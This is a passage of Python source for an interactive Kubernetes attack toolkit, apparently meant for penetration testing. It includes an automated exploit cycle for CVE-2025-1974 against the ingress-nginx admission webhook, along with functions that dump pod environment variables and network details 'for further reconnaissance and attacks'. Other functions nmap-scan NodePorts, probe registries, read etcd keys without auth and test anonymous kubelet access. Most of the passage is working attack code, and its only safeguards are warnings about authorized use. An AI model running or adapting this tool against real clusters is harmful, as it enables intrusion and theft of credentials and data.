            logger.info(f"     kubectl delete -f {save_path}")
        else:
            logger.info(f"     kubectl patch ingress {ingress_name} -n {ingress_ns} --type='merge' -p '{{\"metadata\":{{\"annotations\":{{\"{preset['annotation_key']}\":null}}}}}}'")
        logger.warning("WARNING: Using PoC payloads may be destructive. Use only in authorized test environments.")

    elif mode == 'auto':
        logger.warning("Automatic mode will perform the full CVE-2025-1974 exploit cycle, which may be destructive.")
        confirm = input('Are you sure you want to proceed in automatic mode? [y/N]: ').lower()
        if not confirm.startswith('y'):
            logger.info("Automatic mode cancelled.")
            return

        if not existing_ingress:
            logger.info("Step 1: Checking/creating dummy service...")
            svc_check = run(f"kubectl get svc kubernetes -n {ingress_ns}", capture=True)
            if svc_check.returncode != 0:
                logger.info("Creating dummy service...")
                cp = run(f"kubectl create svc clusterip kubernetes --tcp=80 -n {ingress_ns}", capture=True)
                if cp.returncode != 0:
                    logger.error(f"Failed to create dummy service: {cp.stderr}")
                    return
                logger.success("Dummy service created.")

            logger.info("Step 2: Applying Ingress manifest...")
            cp = run(f"kubectl apply -f {save_path}", capture=True)
            if cp.returncode != 0:
                logger.error(f"Failed to apply Ingress manifest: {cp.stderr}")
                if save_path:
                    os.unlink(save_path)
                return
            logger.success(f"Applied Ingress {ingress_name} in namespace {ingress_ns}")
        else:
            logger.info("Using existing Ingress, annotation already applied.")

        logger.info(f"Step 3: Setting up port-forward to webhook (port {webhook_port})...")
        local_port = 1337
        port_forward_cmd = f"kubectl port-forward -n {target['namespace']} {target['pod']} {local_port}:{webhook_port}"
        port_forward_proc = subprocess.Popen(port_forward_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        import time
        time.sleep(2)

        if port_forward_proc.poll() is not None:
            logger.error(f"Failed to set up port-forward: {port_forward_proc.stderr.read()}")
            if save_path and not existing_ingress:
                run(f"kubectl delete -f {save_path}", capture=True)
                os.unlink(save_path)
            return

        logger.info("Step 4: Sending AdmissionReview request...")
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.json') as tf:
            tf.write(POC_JSON_CONTENT)
            poc_path = tf.name
        curl_cmd = f"curl --insecure -v -H 'Content-Type: application/json' --data @{poc_path} https://localhost:{local_port}/fake/path"
        cp = run(curl_cmd, capture=True)
        os.unlink(poc_path)
        if cp.returncode != 0:
            logger.error(f"Failed to send AdmissionReview request: {cp.stderr}")
        else:
            logger.success("Sent AdmissionReview request. Checking response...")
            logger.info(f"Response: {cp.stdout}")

        logger.info("Step 5: Checking ingress controller logs...")
        log_cmd = f"kubectl logs {target['pod']} -n {target['namespace']}"
        cp = run(log_cmd, capture=True)
        if cp.returncode == 0:
            logger.info("Recent logs (check for 'successfully validated configuration, accepting'):")
            logger.info('\n'.join(cp.stdout.splitlines()[-10:]))
        else:
            logger.error(f"Failed to retrieve logs: {cp.stderr}")

        logger.info("Step 6: Cleaning up...")
        if save_path and not existing_ingress:
            run(f"kubectl delete -f {save_path}", capture=True)
            run(f"kubectl delete svc kubernetes -n {ingress_ns}", capture=True)
            os.unlink(save_path)
        else:
            logger.info("Removing PoC annotation from existing Ingress...")
            cp = run(f"kubectl patch ingress {ingress_name} -n {ingress_ns} --type='merge' -p '{{\"metadata\":{{\"annotations\":{{\"{preset['annotation_key']}\":null}}}}}}'", capture=True)
            if cp.returncode != 0:
                logger.error(f"Failed to remove annotation: {cp.stderr}")
            else:
                logger.success("Removed PoC annotation.")
        port_forward_proc.terminate()
        logger.success("Cleaned up resources.")

        logger.info("Automatic exploitation cycle completed. Check logs above for success indicators.")
        logger.warning("WARNING: Verify results manually. Use only in authorized test environments.")

def nodeport_scanner():
    """List NodePort services and suggest which IP:port to try from outside the cluster."""
    logger.info("[5] NodePort scanner")
    services = kubectl_json('get svc --all-namespaces')
    if not services:
        logger.error("Could not list services.")
        return

    nodeports = []
    for s in services.get('items', []):
        spec = s.get('spec', {})
        if spec.get('type') == 'NodePort':
            ns = s['metadata']['namespace']
            name = s['metadata']['name']
            for p in spec.get('ports', []):
                nodeports.append((ns, name, p.get('nodePort'), p.get('port'), p.get('protocol')))

    if not nodeports:
        logger.info("No NodePort services found.")
        return

    logger.info("Found NodePort services:")
    for ns, name, nport, port, proto in nodeports:
        logger.info(f"   - {ns}/{name} nodePort={nport} targetPort={port} proto={proto}")

    nodes = kubectl_json('get nodes')
    if nodes:
        for n in nodes.get('items', []):
            addrs = n.get('status', {}).get('addresses', [])
            ips = [a['address'] for a in addrs if a.get('type') in ('ExternalIP', 'InternalIP')]
            logger.info(f"Node {n['metadata']['name']} -> {ips}")
    logger.info("Try <node-ip>:<nodePort> from your testing host if network permits.")

    if input('Run nmap scan on ports 30000-32767 for nodes? [y/N]: ').lower().startswith('y'):
        if which("nmap") is None:
            logger.error("nmap not found. Install nmap to use this feature.")
            return
        if nodes:
            for n in nodes.get('items', []):
                addrs = n.get('status', {}).get('addresses', [])
                ips = [a['address'] for a in addrs if a.get('type') in ('ExternalIP', 'InternalIP')]
                if ips:
                    ip = ips[0]
                    logger.info(f"Scanning Node {n['metadata']['name']} IP {ip} ports 30000-32767...")
                    cp = run(f"nmap -sV -p 30000-32767 {ip}", capture=True)
                    if cp.returncode == 0:
                        logger.info(cp.stdout)
                    else:
                        logger.error(f"Failed: {cp.stderr}")
        else:
            logger.error("No nodes found for scanning.")

def env_info():
    """Gain environment information from a pod: env, /etc/hosts, etc."""
    logger.info("[6] Gaining Environment Information from a pod")
    pods = kubectl_json("get pods --all-namespaces")
    if not pods:
        logger.error("Could not list pods.")
        return

    pod_list = []
    for p in pods.get('items', []):
        ns = p['metadata']['namespace']
        name = p['metadata']['name']
        pod_list.append((ns, name))

    if not pod_list:
        logger.info("No pods found.")
        return

    logger.info(f"Found {len(pod_list)} pods:")
    for i, (ns, name) in enumerate(pod_list, 1):
        logger.info(f"   {i}. {ns}/{name}")

    choice = input("Choose a pod index to inspect (or press Enter to cancel): ").strip()
    if not choice:
        logger.info("Cancelled.")
        return
    try:
        idx = int(choice) - 1
        ns, name = pod_list[idx]
    except (ValueError, IndexError):
        logger.error("Invalid choice")
        return

    commands = [
        "env",
        "cat /etc/hosts",
        "cat /etc/resolv.conf",
        "ip route show",
        "ifconfig"
    ]

    for cmd in commands:
        logger.info(f"Executing: {cmd} in {ns}/{name}")
        cp = run(f"kubectl exec -n {ns} {name} -- {cmd}", capture=True)
        if cp.returncode == 0:
            logger.info(cp.stdout)
        else:
            logger.error(f"Failed: {cp.stderr}")

    logger.info("Use this information for further reconnaissance and attacks.")

def registry_scanner():
    """Search for registries in the cluster and curl /v2/_catalog to check auth."""
    logger.info("[7] Search for registries in the cluster")
    services = kubectl_json('get svc --all-namespaces')
    if not services:
        logger.error("Could not list services.")
        return

    registries = []
    for s in services.get('items', []):
        ns = s['metadata']['namespace']
        name = s['metadata']['name']
        ports = s.get('spec', {}).get('ports', [])
        for p in ports:
            if p.get('port') == 5000 or 'registry' in name.lower():
                cluster_ip = s.get('spec', {}).get('clusterIP')
                domain = f"{name}.{ns}.svc.cluster.local"
                registries.append((ns, name, cluster_ip, domain, p.get('port')))

    if not registries:
        logger.info("No potential registries found (port 5000 or name containing 'registry').")
        return

    logger.info(f"Found {len(registries)} potential registries:")
    for ns, name, ip, domain, port in registries:
        logger.info(f"   - {ns}/{name} IP={ip} domain={domain} port={port}")
        logger.info(f"Checking /v2/_catalog for {domain}:{port}...")
        cp = run(f"curl -s -m 5 http://{domain}:{port}/v2/_catalog", capture=True)
        if cp.returncode == 0:
            if 'login' in cp.stdout.lower() or '401' in cp.stdout or '403' in cp.stdout:
                logger.warning("Authentication required (401/403 or login prompt)")
            else:
                logger.success(f"No authentication (200 OK): {cp.stdout[:200]}...")
        else:
            logger.error(f"Failed to access: {cp.stderr}")

    logger.info("Note: If HTTPS, try https:// with -k for curl. This checks for auth on registries.")

def ns_bypass():
    """Kubernetes namespaces bypass check: list ns and try access pods in them."""
    logger.info("[8] Kubernetes namespaces bypass check")
    ns_list = kubectl_json("get namespaces")
    if not ns_list:
        logger.error("Could not list namespaces.")
        return

    ns_names = [n['metadata']['name'] for n in ns_list.get('items', [])]
    logger.info(f"Found namespaces: {len(ns_names)}")
    for name in ns_names:
        logger.info(f"Checking access to pods in namespace {name}...")
        cp = run(f"kubectl get pods -n {name}", capture=True)
        if cp.returncode == 0:
            logger.success("Accessible! Pods:")
            logger.info(cp.stdout)
        else:
            logger.warning("Not accessible (RBAC restriction?):")
            logger.info(cp.stderr)

    logger.info("This checks RBAC permissions for getting pods in each namespace.")
    logger.info("Note: Even if not accessible via RBAC, network bypass may allow direct IP access to services/pods.")

def core_components_check():
    """Check core components: apiserver flags, etcd no-TLS, kubelet anon access."""
    logger.info("[9] Core components check (apiserver, etcd, kubelet)")

    # Check kube-apiserver flags
    logger.info("Checking kube-apiserver flags (--anonymous-auth, --insecure-port)...")
    apiserver_pods = kubectl_json("get pods -n kube-system -l component=kube-apiserver")
    if not apiserver_pods:
        logger.error("Could not find kube-apiserver pods.")
    else:
        for p in apiserver_pods.get('items', []):
            name = p['metadata']['name']
            cp = run(f"kubectl exec -n kube-system {name} -- cat /proc/1/cmdline", capture=True)
            if cp.returncode == 0:
                cmdline = cp.stdout.strip().replace('\x00', ' ')
                anon_auth = '--anonymous-auth=true' in cmdline
                insecure_port = '--insecure-port=' in cmdline
                logger.info(f"Pod {name}:")
                if anon_auth:
                    logger.warning("--anonymous-auth=true (anonymous access enabled)")
                else:
                    logger.success("--anonymous-auth=false (ok)")
                if insecure_port:
                    logger.warning("--insecure-port enabled (insecure HTTP port)")
                else:
                    logger.success("--insecure-port not enabled (ok)")
            else:
                logger.error(f"Failed to get cmdline for {name}: {cp.stderr}")

    # Check etcd
    logger.info("Checking etcd access without TLS (port 2379)...")
    etcd_pods = kubectl_json("get pods -n kube-system -l component=etcd")
    if not etcd_pods:
        logger.error("Could not find etcd pods.")
    else:
        for p in etcd_pods.get('items', []):
            name = p['metadata']['name']
            node_name = p['spec']['nodeName']
            node = kubectl_json(f"get node {node_name}")
            if node:
                addrs = node.get('status', {}).get('addresses', [])
                ips = [a['address'] for a in addrs if a.get('type') == 'InternalIP']
                if ips:
                    etcd_ip = ips[0]
                    logger.info(f"Trying curl on etcd at {etcd_ip}:2379/version...")
                    cp = run(f"curl -m 5 http://{etcd_ip}:2379/version", capture=True)
                    if cp.returncode == 0:
                        logger.warning(f"Accessible without TLS: {cp.stdout}")
                    else:
                        logger.success("Not accessible without TLS (ok or requires TLS/auth)")
                    if which("etcdctl"):
                        logger.info("Checking etcd access with etcdctl (read all keys)...")
                        cp = run(f"etcdctl --endpoints=http://{etcd_ip}:2379 get / --prefix --keys-only", capture=True)
                        if cp.returncode == 0:
                            logger.warning(f"Accessible without auth/TLS: {cp.stdout[:200]}...")
                        else:
                            logger.success(f"Not accessible (ok): {cp.stderr}")
                    else:
                        logger.warning("etcdctl not found. Skip etcdctl check.")
                else:
                    logger.error(f"No InternalIP for node {node_name}")
            else:
                logger.error(f"Could not get node {node_name}")

    # Check kubelet
    logger.info("Checking kubelet anonymous access (port 10250)...")
    nodes = kubectl_json("get nodes")
    if not nodes:
        logger.error("Could not get nodes.")
    else:
        for n in nodes.get('items', []):
            name = n['metadata']['name']
            addrs = n.get('status', {}).get('addresses', [])
            ips = [a['address'] for a in addrs if a.get('type') == 'InternalIP']
            if ips:
                kubelet_ip = ips[0]
                logger.info(f"Trying anonymous access to kubelet at {kubelet_ip}:10250/pods...")
                cp = run(f"curl -k -m 5 https://{kubelet_ip}:10250/pods", capture=True)
                if cp.returncode == 0 and 'Unauthorized' not in cp.stdout:
                    logger.warning("Anonymous access allowed: Returns pods info")
                else:
                    logger.success("Anonymous access denied (ok)")
            else:
                logger.error(f"No InternalIP for node {name}")

    logger.info("Core components check complete. Review for vulnerabilities.")

def spawn_shell():
    """Spawn a shell and return to menu after exit."""
    logger.info("[10] Spawning shell. Type 'exit' to return to menu.")
    subprocess.run("/bin/bash", shell=True)
    logger.info("Returned to menu.")

# ---------------------
# Command registry
# ---------------------
COMMANDS = [
    ("pod2node", "Generate privileged pod YAML and inspect nodes/pods", pod2node_interactive),
    ("privscan", "Scan for privileged containers (enumeration only)", privileged_containers_scan),
    ("rbac", "RBAC token scanner - check SA tokens for dangerous perms", rbac_token_checker),
    ("ingress", "Check ingress controller images/versions and craft Ingress with PoC for CVE-2025-1974", ingress_checker),
    ("nodeport", "List NodePort services and node IP hints", nodeport_scanner),
    ("envinfo", "Gain environment information from a pod (env, hosts, etc.)", env_info),
    ("registryscan", "Search for registries in the cluster and suggest curling them", registry_scanner),
    ("nsbypass", "Kubernetes namespaces bypass check (list ns and try access pods)", ns_bypass),
    ("corecheck", "Check core components (apiserver flags, etcd no-TLS, kubelet anon access)", core_components_check),
    ("shell", "Spawn a shell and return to menu", spawn_shell),
]

def print_menu():
    logger.info("Available commands:")
    for i, (key, desc, _) in enumerate(COMMANDS, 1):
        logger.info(f"  {i}. {key:<10} - {desc}")
    logger.info("  q. quit")

def main():
    global BANNER_SHOWN
    check_prereqs()
    if not BANNER_SHOWN:
        logger.info(BANNER)
        BANNER_SHOWN = True
    
    while True:
        print_menu()
        choice = input('Select an option (number or command): ').strip()
        if not choice:
            continue
        if choice.lower() in ('q', 'quit', 'exit'):
            logger.info("bye")
            break
        func = None
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(COMMANDS):
                func = COMMANDS[idx][2]
        else:
            for key, _, f in COMMANDS:
                if choice == key:
                    func = f
                    break
        if func is None:
            logger.error("Invalid choice. Pick a number or command name.")
            continue
        try:
            func()
        except KeyboardInterrupt:
            logger.info("Interrupted, returning to menu.")
        except Exception as e:
            logger.error(f"Error in command: {e}")

if __name__ == '__main__':
    main()

